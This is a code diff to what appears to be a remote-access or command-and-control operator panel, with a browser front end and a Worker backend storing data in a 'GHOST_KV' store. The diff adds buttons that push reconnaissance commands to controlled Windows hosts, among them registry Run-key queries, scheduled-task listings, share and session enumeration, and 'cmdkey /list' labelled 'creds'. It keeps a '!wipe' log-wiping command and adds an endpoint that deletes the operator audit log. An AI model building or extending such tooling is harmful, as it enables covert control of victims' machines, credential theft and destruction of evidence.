@@ -952,14 +952,25 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
         <button class="qcmd" onclick="sendCmd('net localgroup administrators')">local admins</button>
         <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
         <button class="qcmd" onclick="sendCmd('arp -a')">arp</button>
-        <button class="qcmd" onclick="sendCmd('!wipe')">wipe logs</button>
+        <button class="qcmd" onclick="sendCmd('route print')">routes</button>
+        <button class="qcmd" onclick="sendCmd('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')">run keys</button>
+        <button class="qcmd" onclick="sendCmd('schtasks /query /fo LIST /v')">schtasks</button>
+        <button class="qcmd" onclick="sendCmd('dir C:\\Users /s /b')">users dir</button>
+        <button class="qcmd" onclick="sendCmd('wmic product get name,version')">installed</button>
+        <button class="qcmd" onclick="sendCmd('net share')">shares</button>
+        <button class="qcmd" onclick="sendCmd('net session')">sessions</button>
+        <button class="qcmd" onclick="sendCmd('cmdkey /list')">creds</button>
+        <button class="qcmd" onclick="sendCmd('!wipe')" style="color:var(--red);border-color:rgba(255,59,92,.4)">wipe logs</button>
       </div>
     </div>
   </div>
   <div id="audit-panel">
     <div class="pane-head">
       <span class="pane-label">Audit Log</span>
-      <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
+      <div style="display:flex;align-items:center;gap:6px">
+        <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
+        <button class="icon-btn" onclick="clearAudit()" title="Clear log" style="color:var(--red);font-size:11px">&#x2715;</button>
+      </div>
     </div>
     <div id="audit-list"><div class="no-audit">NO ENTRIES</div></div>
   </div>
@@ -1216,6 +1227,14 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
   }
   window.fetchAudit = fetchAudit;
 
+  async function clearAudit() {
+    if (!confirm('Clear entire audit log?')) return;
+    await api('/audit/clear', {method:'POST'});
+    document.getElementById('audit-list').innerHTML='<div class="no-audit">NO ENTRIES</div>';
+    toast('AUDIT LOG CLEARED','warn');
+  }
+  window.clearAudit = clearAudit;
+
   function fmt(s){if(!s&&s!==0)return'—';s=Math.floor(s);return s<60?s+'s':s<3600?Math.floor(s/60)+'m '+((s%60)||'')+'s':Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';}
   function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
 
@@ -1335,6 +1354,12 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleAudit(request, env), env);
+  }
+  if (path === "/audit/clear" && method === "POST") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    await env.GHOST_KV.delete("audit_log");
+    return withCORS(jsonResponse({ status: "cleared" }), env);
   }
   if (path === "/payload" && method === "POST") {
     const authErr = requireOperatorToken(request, env);
